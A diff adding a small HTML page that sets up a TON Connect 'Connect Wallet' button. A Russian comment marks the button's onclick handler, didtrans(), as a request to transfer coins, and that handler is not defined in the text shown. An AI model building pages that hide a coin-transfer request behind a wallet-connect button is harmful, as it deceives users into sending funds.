@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
+</head>
+<body>
+
+
+
+<div id="ton-connect" onclick="didtrans();"></div><!--Запрос трансфера монет-->
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        const tonConnectButton = document.getElementById("ton-connect");
+        const tonConnect = new TonConnectUI({
+            buttonRootId: "ton-connect",
+            buttonOptions: {
+                buttonType: "custom",
+                customButtonContent: "Connect Wallet"
+            }
+        });
+
+        tonConnectButton.addEventListener("click", function() {
+            tonConnect.connectWallet();
+        });
+    });
+</script>
+
+
+
+<script src="tonsdk.js"></script>
+ 
+    
+
+
+
+</body>
+
+
+</html>
